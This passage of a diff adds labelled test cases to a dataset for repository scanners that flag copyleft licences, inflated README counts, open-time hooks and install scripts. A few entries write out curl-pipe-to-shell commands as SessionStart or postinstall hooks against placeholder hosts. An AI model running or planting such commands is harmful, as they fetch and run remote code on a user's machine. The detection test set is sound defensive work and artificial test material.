+   "sha256": "c4541b06684521b3e11d0e06f2ed6ac1de457e86d7bed99c7594bb19ddcd8c36",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg11",
+   "label": "negative",
+   "property": "package.json declares MIT and a dependency name contains 'gpl'; no licence file or SPDX header names a copyleft licence.",
+   "sha256": "8972acca4a087f4b506dc5a33bdf82ccb0d0fcd824bfd58390cf2dbc02b7ed0b",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg12",
+   "label": "negative",
+   "property": "A setup script asks the user to pick between MIT, Apache-2.0 and GPL-3.0 in a prompt string.",
+   "sha256": "1c98d55aed4cb9278b40a4ef41b670d30632afaab67d80fa8b158067375006e3",
+   "split": "dev"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg13",
+   "label": "negative",
+   "property": "The root LICENSE is a GNU Affero licence text and a source file carries a GPL SPDX header.",
+   "sha256": "4f1456526e16fdafa38c827c8414c2c1722bc1ac7d0f265bf4a39e6cbf247b3d",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg14",
+   "label": "negative",
+   "property": "The root LICENSE and a vendored LICENSE are both BSD 3-Clause texts.",
+   "sha256": "b982f171494296984a3e81ea607def403956756cab67a1448d82145231733700",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg15",
+   "label": "negative",
+   "property": "A vendored directory holds a Creative Commons attribution licence text; no GNU licence text exists.",
+   "sha256": "994188bed2d570fbadd7ce26de5fc16a9bbd1d2649f3957da63b28f614814ff2",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg16",
+   "label": "negative",
+   "property": "A source file carries an SPDX header naming Apache-2.0 with an exception; no copyleft identifier appears.",
+   "sha256": "9fe060207920dbd43604a0fcdaac32ca5b19c06d61da3dd0cf2506f13c98bb30",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg17",
+   "label": "negative",
+   "property": "The root LICENSE is an all-rights-reserved notice, not a permissive licence, and a vendored directory holds a GNU licence text.",
+   "sha256": "96dade7a987bec7d7eafdc60836558409e57986f53d3460488aafce566935e78",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg18",
+   "label": "negative",
+   "property": "A document named for the GPL discusses it in prose; no licence file or SPDX header names it.",
+   "sha256": "203cea4816cf37f0ca30c1f8001be52b40348d34e308b8ef2ef9ee695a6520bb",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg19",
+   "label": "negative",
+   "property": "Three source files carry SPDX headers naming MIT only.",
+   "sha256": "c4fa674c8ca418edc202d34c1b3c60958884fae6d772d24791974e7a1bf74953",
+   "split": "dev"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg20",
+   "label": "negative",
+   "property": "A vendored NOTICE file lists third-party software under the MIT licence; no copyleft text exists.",
+   "sha256": "7814bb00e911728e5942f54b16b30728f157ef6d8e6faf1f6db679f4e1a26d1a",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos01",
+   "label": "positive",
+   "property": "The README states a count of 12 and the tree holds 1 distinct skills definitions, fewer than half of the stated number.",
+   "sha256": "1358db424a05bae23232f5d4fb1560bf2b21ea87a635cdb332e0b3afffaea00f",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos02",
+   "label": "positive",
+   "property": "The README states a count of 50 and the tree holds 4 distinct skills definitions, fewer than half of the stated number.",
+   "sha256": "6007ddc216dbf8160df49f2e6b3ae801e2aa29ed504323c24dbc0df2c7065aa3",
+   "split": "dev"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos03",
+   "label": "positive",
+   "property": "The README states a count of 30 and the tree holds 3 distinct skills definitions, fewer than half of the stated number.",
+   "sha256": "17357217d07fdd86ce36089d006b209b1e24c160db7fc0b74706287431a155db",
+   "split": "dev"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos04",
+   "label": "positive",
+   "property": "The README states a count of 1200 and the tree holds 2 distinct skills definitions, fewer than half of the stated number.",
+   "sha256": "d8bd2ee2f85daa1b80a3d82f23f150390bc0d48dda9ae99a4c633eca35ae9df9",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos05",
+   "label": "positive",
+   "property": "The README states a count of 18 and the tree holds 0 distinct skills definitions, fewer than half of the stated number.",
+   "sha256": "9b2676e3221d6bf3a90e0d7b84a83cc665d80519f828ab0e82aced0daea01377",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos06",
+   "label": "positive",
+   "property": "The README states a count of 25 and the tree holds 3 distinct agents definitions, fewer than half of the stated number.",
+   "sha256": "740b16bccba901c204dc8c3d0fd9609bb8a02cd5b2f251c099cb0953c4bfe95c",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos07",
+   "label": "positive",
+   "property": "The README states a count of 10 and the tree holds 1 distinct agents definitions, fewer than half of the stated number.",
+   "sha256": "6b012a1a9cc87185d05422bdad85acec9b97f9a527fcf0dc7f508da8b12ae0de",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos08",
+   "label": "positive",
+   "property": "The README states a count of 30 and the tree holds 5 distinct commands definitions, fewer than half of the stated number.",
+   "sha256": "46a12f8f5f7c88eb0453148f322974213c4a5ae3d7cdf0e20cd98e1dc6f2232b",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos09",
+   "label": "positive",
+   "property": "The README states a count of 40 and the tree holds 6 distinct skills definitions, fewer than half of the stated number.",
+   "sha256": "dbf63a6967caab43c8c47fc5cfd5ee87b15b014e35614efa0cb456948495cd25",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos10",
+   "label": "positive",
+   "property": "The README states a count of 16 and the tree holds 2 distinct skills definitions, fewer than half of the stated number.",
+   "sha256": "e14338c97cb0337f97f23c49e6d249d623c388c855a64caf443a73be951d5435",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos11",
+   "label": "positive",
+   "property": "The README states a count of 24 and the tree holds 4 distinct agents definitions, fewer than half of the stated number.",
+   "sha256": "88b992604771aaee32f35918fccb555cfcacb4d7bf9cbf015e74eab07dc5ce19",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos12",
+   "label": "positive",
+   "property": "The README states a count of 20 and the tree holds 2 distinct commands definitions, fewer than half of the stated number.",
+   "sha256": "ac028c57abc5f1890000366f209e00aa6a849b8727db64066ae5d6a149876147",
+   "split": "dev"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos13",
+   "label": "positive",
+   "property": "The README states a count of 60 and the tree holds 5 distinct skills definitions, fewer than half of the stated number.",
+   "sha256": "accf4adbb74a4841d43259409dd77b537e91789362bc70d88cbfdc656d8d394d",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos14",
+   "label": "positive",
+   "property": "The README states a count of 14 and the tree holds 3 distinct skills definitions, fewer than half of the stated number.",
+   "sha256": "7d035d8bc1c0d2fd04782104abca24f8ade393433d1b80141fcc3981d83596cc",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos15",
+   "label": "positive",
+   "property": "The README states a count of 22 and the tree holds 1 distinct skills definitions, fewer than half of the stated number.",
+   "sha256": "f164f16c019ddb87bd7e62ab0871a8b10b56f3765d5dc80dd5c2da4e870241fe",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos16",
+   "label": "positive",
+   "property": "The README states a count of 100 and the tree holds 7 distinct skills definitions, fewer than half of the stated number.",
+   "sha256": "0300bddcc3b448ccfdfa221e3f35513a04e96a475a2a9274f927df1c9adb8a20",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos17",
+   "label": "positive",
+   "property": "The README states a count of 9 and the tree holds 0 distinct agents definitions, fewer than half of the stated number.",
+   "sha256": "af8caaf4ec92e4afd0e875c76cbf16d8a8b209b051aeabf1d7f9e16ad678aca0",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos18",
+   "label": "positive",
+   "property": "The README states a count of 35 and the tree holds 0 distinct commands definitions, fewer than half of the stated number.",
+   "sha256": "ef8b1a9ce91a558caa616347a19b31f0116474ba8d15bd28dea92ec55e5938c7",
+   "split": "dev"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos19",
+   "label": "positive",
+   "property": "The README states a count of 80 and the tree holds 0 distinct skills definitions, fewer than half of the stated number.",
+   "sha256": "a8c44abd07002cdd38d9ecb198505ddbd5fcde6baf3180f4f8450162c2391453",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-pos20",
+   "label": "positive",
+   "property": "The README states a count of 45 and the tree holds 6 distinct skills definitions, fewer than half of the stated number.",
+   "sha256": "5d6b93b66ff868397dc4a7fd6dfccab9e7cf14ad7cb99f27ff312d21849535e8",
+   "split": "dev"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg01",
+   "label": "negative",
+   "property": "The README states 2 skills and the tree holds 5.",
+   "sha256": "f18e2dd9be30908bcd30a1004273f56046c599210ac88a236ce50c317b622153",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg02",
+   "label": "negative",
+   "property": "The README states 12 skills and the tree holds 12 distinct skill definitions.",
+   "sha256": "251bc649d6dc8f86c8bae28862ed49986db77f8dad83eafe05d12b1c3e999c54",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg03",
+   "label": "negative",
+   "property": "The README states 20 skills and the tree holds 19.",
+   "sha256": "048639715c85c779a99cbedbf9d6ba7abf36c697792871dc5b658d6491769f18",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg04",
+   "label": "negative",
+   "property": "The README states 8 skills and the tree holds 8.",
+   "sha256": "3626485cbc65d063591357300332cacfcfa4b536584b5a397764ab63a1344f12",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg05",
+   "label": "negative",
+   "property": "The README says it works with 15 agents, a statement about hosts, and the tree holds 3 agent definitions.",
+   "sha256": "642f08e7eca7ec60b61259ac852302b70b01246670ef055c92a687f58ced7adf",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg06",
+   "label": "negative",
+   "property": "The README states 340 tests and the tree holds 2 test files; the unit of the claim is cases.",
+   "sha256": "732ed7cc983f4a43a65df208cc9451e028bcaaac8b4b1374946390114b78fdb9",
+   "split": "dev"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg07",
+   "label": "negative",
+   "property": "A document under docs/ states 12 skills; the README states no count.",
+   "sha256": "10dc631fad4914a5efecfa21353b5de68294677ce5733c5075b89435b0a106ab",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg08",
+   "label": "negative",
+   "property": "The README states a speed ratio and no count of skills, agents or commands.",
+   "sha256": "9d0324fde9013b441f26750f6428a03e9cf9de55a17073561b5e3adfb45ecc9e",
+   "split": "dev"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg09",
+   "label": "negative",
+   "property": "The README states no number at all.",
+   "sha256": "b735a2be795faa58a941ea79296968cb69338a24381cc5f2933964106eb5440e",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg10",
+   "label": "negative",
+   "property": "The README states 12 skill categories, not 12 skills; the tree holds 3 skills.",
+   "sha256": "49488c92b93f1f240343918c3a97be347052a288f508396e1afc8c2cc6c42827",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg11",
+   "label": "negative",
+   "property": "The README states 3 skill levels, not 3 shipped skills; the tree holds 1.",
+   "sha256": "dc8855e82ff16d38c48d13f042af257d50e43292e51bd2a6e82f8508b6f30c58",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg12",
+   "label": "negative",
+   "property": "The README states a rival's 50 skills and its own 6; the tree holds 6.",
+   "sha256": "d89c885ae0628bb0dbe5da0644410661a396c81e6ac7c9756da72c1aae8bbc55",
+   "split": "dev"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg13",
+   "label": "negative",
+   "property": "The README states a plan for 40 skills in the future tense; the tree holds 2.",
+   "sha256": "52d648847f47ca4cfd26f08b9432b15d8b2aa8a8d63c03fd998bdafdab74e650",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg14",
+   "label": "negative",
+   "property": "The README states 6 agents and the tree holds 6 agent definitions under .claude/agents.",
+   "sha256": "c5fca4489ea5302018e93377c859d5c73041a877b6251b7e8cf402a41f6cd8d0",
+   "split": "dev"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg15",
+   "label": "negative",
+   "property": "The README states 5 commands and the tree holds 5.",
+   "sha256": "ce921cf22c77a4bcb0ea4e14384cb040a5fcc1e3fae0be1b90178a67fc81f84d",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg16",
+   "label": "negative",
+   "property": "The README states compatibility with 20 agents and 30 commands of other hosts; the tree holds none.",
+   "sha256": "4b68783b8eff72171ab76277010d8c0a074d4feeab32ecbf1f26514617370152",
+   "split": "dev"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg17",
+   "label": "negative",
+   "property": "The README states 10 skills and the tree holds 11.",
+   "sha256": "094acf9dab285f43cf7f276cd99076f81ebb91a455b532874111d60fede74b98",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg18",
+   "label": "negative",
+   "property": "The README states 3 skills and the tree holds 3.",
+   "sha256": "9a6e6538fe367384fab291cfd8dc3e0f482b6e3f01dac68999c064d79c0679c9",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg19",
+   "label": "negative",
+   "property": "The README states integration with 25 skills of other catalogues; the tree holds none of its own.",
+   "sha256": "c95c635d04305dae03b8f789bf73c9db421cf32ae11949dfcfd2ea989731e869",
+   "split": "test"
+  },
+  {
+   "check": "contradicted-claim",
+   "id": "contradicted-claim-neg20",
+   "label": "negative",
+   "property": "The README states a coverage figure and a test count; the tree holds 1 test file and no skill, agent or command claim exists.",
+   "sha256": "c18a22dd71ac587913d72026d349b1f7341ecb6f8b93a66815b44b3ab74863e6",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos01",
+   "label": "positive",
+   "property": ".claude/settings.json defines a SessionStart hook whose command is 'npm install --silent'.",
+   "sha256": "7f8dc0b03ee5a6b731434f2e4882f9605a3a7a53e4ff0cd95e739326306d1175",
+   "split": "dev"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos02",
+   "label": "positive",
+   "property": ".claude/settings.json defines a SessionStart hook whose command is './scripts/setup.sh'.",
+   "sha256": "ccb44eb58c9d6b9bb8e105afbcd99b04911f4b57df4f5c8039b64faa0ae63579",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos03",
+   "label": "positive",
+   "property": ".claude/settings.json defines a SessionStart hook whose command is 'python3 scripts/bootstrap.py'.",
+   "sha256": "bf443e5712f017846ba00f79c7e0c08b07b2ad26a6aa644002f7559fabc90568",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos04",
+   "label": "positive",
+   "property": ".claude/settings.json defines a SessionStart hook whose command is 'echo ready >> .session.log'.",
+   "sha256": "287641c4ff15a727d74dc0a08417e6e8a0662b12a6b54773c0db70a6654c863e",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos05",
+   "label": "positive",
+   "property": ".claude/settings.json defines a SessionStart hook whose command is 'git fetch --quiet'.",
+   "sha256": "afaa055eec27414fb7b93b38267b6b92288a2c4f454a2ab4a396ce087d298847",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos06",
+   "label": "positive",
+   "property": ".claude/settings.json defines a SessionStart hook whose command is 'bash .claude/hooks/start.sh'.",
+   "sha256": "1d9b3a0cd324227c47626de8af916f83b9be8623c9f152583c915fbf6d929d02",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos07",
+   "label": "positive",
+   "property": ".claude/settings.json defines a SessionStart hook whose command is 'node tools/warm-cache.js'.",
+   "sha256": "078479790b712952ebf60806af9f6ed3ea3d4272758f03e645e7e7b7a9bfc9de",
+   "split": "dev"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos08",
+   "label": "positive",
+   "property": ".claude/settings.json defines a SessionStart hook whose command is 'make deps'.",
+   "sha256": "490b70bc4e32e340af6073f3bf6823db56bf3899405256fad4a216d9b760df50",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos09",
+   "label": "positive",
+   "property": ".claude/settings.json defines a SessionStart hook whose command is 'curl -fsSL https://dl.example.invalid/s | sh'.",
+   "sha256": "0ad4565b6a241c6c0769b3bb67bf1fe63335e5b2011c1f172400e466356abc43",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos10",
+   "label": "positive",
+   "property": ".claude/settings.json defines a SessionStart hook whose command is 'sh .vscode/prepare.sh'.",
+   "sha256": "14c1129c33224ee8a962df9099b41711cdbad34eabea8003bc89d8d981e8178f",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos11",
+   "label": "positive",
+   "property": ".claude/settings.json defines a SessionStart hook whose command is 'uv sync'.",
+   "sha256": "00e43d6d85500b28ad756a1c4e3858e5dc341dc6a46d8a897b4b535a26e4d4fa",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos12",
+   "label": "positive",
+   "property": ".vscode/tasks.json defines a shell task running npm install whose runOptions set runOn to folderOpen.",
+   "sha256": "afdc79b60502eb509f0c9caccbd7c6750cb8d93dfc306073b316427588311051",
+   "split": "dev"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos13",
+   "label": "positive",
+   "property": ".vscode/tasks.json defines a task running a repository script whose runOptions set runOn to folderOpen.",
+   "sha256": "d41a5469bf68dbd00b043be28a51977d1602049320be5e1a17704638e982efd6",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos14",
+   "label": "positive",
+   "property": ".vscode/tasks.json defines a task with an args array whose runOptions set runOn to folderOpen.",
+   "sha256": "b6be1602062eed4b936919f71a18e4cc0089f700818dfa11764c2425cc491018",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos15",
+   "label": "positive",
+   "property": ".vscode/tasks.json defines a task running a node script whose runOptions set runOn to folderOpen.",
+   "sha256": "a7d9d6dc6913cb3e572438f5dfed7d5ddcc42e55578a68ccaf60a5bd773400a3",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos16",
+   "label": "positive",
+   "property": ".vscode/tasks.json defines a task running git fetch whose runOptions set runOn to folderOpen.",
+   "sha256": "59b19b83d2cc01e73dffb5164ab0b0aebab1a8642b864bc375d13a94b3350c7c",
+   "split": "dev"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos17",
+   "label": "positive",
+   "property": ".vscode/tasks.json defines a task running uv sync whose runOptions set runOn to folderOpen.",
+   "sha256": "368b20c7b09e3a02ad96857b1d0dcdf9fd7f162d4afbc5c9513a495be96e7944",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos18",
+   "label": "positive",
+   "property": ".vscode/tasks.json defines a task that downloads and pipes into a shell whose runOptions set runOn to folderOpen.",
+   "sha256": "55c19038b8010c5c5813ac0d0c2e95de025fb99ef57d65e77450c4f792f61eb6",
+   "split": "dev"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos19",
+   "label": "positive",
+   "property": ".vscode/tasks.json defines a task deleting a cache whose runOptions set runOn to folderOpen.",
+   "sha256": "b22d20b5c5065fb3bebb0ebee18edad95769187995b4935c009a97248cdca06b",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-pos20",
+   "label": "positive",
+   "property": ".vscode/tasks.json defines a shell task running npm install whose runOptions set runOn to folderOpen.",
+   "sha256": "df62fcff277f3fb179671227b3c4b147eeda7265f41aa919e063e9cf02b36e24",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg01",
+   "label": "negative",
+   "property": "Hooks in .claude/settings.json exist only for the PostToolUse event.",
+   "sha256": "6c91d3ebcb2b82b96ed2fba09898b4e4a50eee75dd5fe2cdeeb079f67795cd37",
+   "split": "dev"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg02",
+   "label": "negative",
+   "property": "Hooks in .claude/settings.json exist only for the Stop event.",
+   "sha256": "4a18831399a5dca8403a43312f6cc0e8302dd2be0ec43c8289245745d27477ca",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg03",
+   "label": "negative",
+   "property": "Hooks in .claude/settings.json exist only for the PreToolUse event.",
+   "sha256": "84e369ecbaffc1c225a717843b6b29ce159a1dbae69921ee1a15eebb2209ce4b",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg04",
+   "label": "negative",
+   "property": "Hooks in .claude/settings.json exist only for the Notification event.",
+   "sha256": "abaaa939cce0a60a96df26e326df39dc57eae2392953b91efe4e01f072a8c76a",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg05",
+   "label": "negative",
+   "property": "Hooks in .claude/settings.json exist only for the UserPromptSubmit event.",
+   "sha256": "73ac41fe4d81f2c0d3f7f19f330bc37285a7d450a609b14b301693b9edab2913",
+   "split": "dev"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg06",
+   "label": "negative",
+   "property": ".claude/settings.json holds permissions and no hooks.",
+   "sha256": "fd6326b7dd30629bb351d12c1de80d58580320830e5b0c6dfd32817040aedc1a",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg07",
+   "label": "negative",
+   "property": ".claude/settings.json holds an empty hooks object.",
+   "sha256": "190ad3b791a2285a10ba5f97e0b518111f4a74eb9f403e867ab65e779e1b037e",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg08",
+   "label": "negative",
+   "property": ".claude/settings.json lists the SessionStart event with an empty array and no command.",
+   "sha256": "a0035f7867a615ebf89c60b02f7b833b8cdd09e5f34f436fe030cb8c90b5196b",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg09",
+   "label": "negative",
+   "property": ".vscode/tasks.json defines a task with no runOptions.",
+   "sha256": "6b6d64b0237391e1a059413d1dced707e1c9cff45357fc74ff6a4d3402081fd4",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg10",
+   "label": "negative",
+   "property": ".vscode/tasks.json defines a task whose runOn is 'default'.",
+   "sha256": "a08978c0007bb55f67c7e04d50cd334362f9af42af0a11fc3c8f18fe82af6784",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg11",
+   "label": "negative",
+   "property": "A file docs/settings-sample.json defines a SessionStart hook and no .claude/settings.json exists.",
+   "sha256": "bc05e5d5b3300c8d274d8e0d20bea28844cecb85211519ac78152f0c504b32db",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg12",
+   "label": "negative",
+   "property": "A file docs/tasks-sample.json defines a folderOpen task and no .vscode/tasks.json exists.",
+   "sha256": "740db985a3b3b9f49b357eae29e43f90a9525be6c7a6d7cd4e9c3f2220d2f8a9",
+   "split": "dev"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg13",
+   "label": "negative",
+   "property": "The README explains in prose how a user can add a SessionStart hook; no settings file defines one.",
+   "sha256": "da0d805477312107ae410415e858c633bf5b1716a82d648cfcd1f919637be2a3",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg14",
+   "label": "negative",
+   "property": ".vscode/tasks.json mentions folderOpen only inside a comment.",
+   "sha256": "d84f9b2b49262ea66096b08cab23faf1fe39c429d96dea92e866bb2b9279f17e",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg15",
+   "label": "negative",
+   "property": ".vscode/tasks.json mentions folderOpen only inside a task label string.",
+   "sha256": "8d272109bafd7b8d9393967e777b1dee1729e3629294cff1297b0abd3e63a84c",
+   "split": "dev"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg16",
+   "label": "negative",
+   "property": ".vscode/launch.json defines a debug configuration with a preLaunchTask and no tasks file runs on open.",
+   "sha256": "f41bcf007a1029bf740628ab5637aeee10f68239bcfc8ea0815fbf73750273c1",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg17",
+   "label": "negative",
+   "property": "package.json defines only start and test scripts.",
+   "sha256": "b92fd783f09e7356571e89bf7dbd847e779bfd35f56a0899acca251e249f65bf",
+   "split": "dev"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg18",
+   "label": "negative",
+   "property": "A pre-commit hook exists under .husky and no session or folder-open hook exists.",
+   "sha256": "d1f27739d8b430da4b7c41cec51e89923e2b10d29a412a98492b16e0e0d476e6",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg19",
+   "label": "negative",
+   "property": "A script named session-start.sh exists under scripts/ and nothing wires it to an open event.",
+   "sha256": "c98172690b5f19e95a7747fd26bfe8ec08eed2528d38155ffd31350d7e6a15b5",
+   "split": "test"
+  },
+  {
+   "check": "open-time-hook",
+   "id": "open-time-hook-neg20",
+   "label": "negative",
+   "property": ".claude/commands holds a slash command file and no settings file defines a hook.",
+   "sha256": "d020eb1ac523f37bd61225b2ab24396a66465c5d7b897821d2dd21607e961b59",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos01",
+   "label": "positive",
+   "property": "package.json defines a scripts entry named preinstall with the command 'node-gyp rebuild'.",
+   "sha256": "d01c695d225e58b757078e80864806b81e019246552e65653c3f24ecc26da548",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos02",
+   "label": "positive",
+   "property": "packages/core/package.json defines a scripts entry named install with the command 'node scripts/setup.js'.",
+   "sha256": "98a0da8e401ffab73abe8c24f5d6e471ba3e634c9bca426d2f54af770dd196cf",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos03",
+   "label": "positive",
+   "property": "tools/cli/package.json defines a scripts entry named postinstall with the command 'husky install'.",
+   "sha256": "0db667ceb140b762184e9869d0dd72b9c830edefe40268bd50ecfa645c97d6b4",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos04",
+   "label": "positive",
+   "property": "package.json defines a scripts entry named preinstall with the command 'patch-package'.",
+   "sha256": "b0567471c0f84c349d6deaa4578031bb75f9406d7564f984e43f212581d1db0e",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos05",
+   "label": "positive",
+   "property": "package.json defines a scripts entry named install with the command 'bash ./setup.sh'.",
+   "sha256": "b2686a528ce379b640f2e8e9daa33e56c3f1cecacd15d79f31178fde5a914ef3",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos06",
+   "label": "positive",
+   "property": "packages/core/package.json defines a scripts entry named postinstall with the command 'curl -fsSL https://pkg.example.invalid/p | sh'.",
+   "sha256": "c1cccb0bf4a7d2a77bc39e38c85baeed400b53a564963df65e6511116fc670e5",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos07",
+   "label": "positive",
+   "property": "tools/cli/package.json defines a scripts entry named preinstall with the command 'node ./build/native.js'.",
+   "sha256": "8188b5ab00513c6f4c7d780471b9f90789885cbac8b59547b126e387c64d3b3e",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos08",
+   "label": "positive",
+   "property": "package.json defines a scripts entry named install with the command 'python3 scripts/fetch.py'.",
+   "sha256": "ec02913098c9317cf16c52f1eb5c52d5476b8d4eea31b0e435956c74ca006a89",
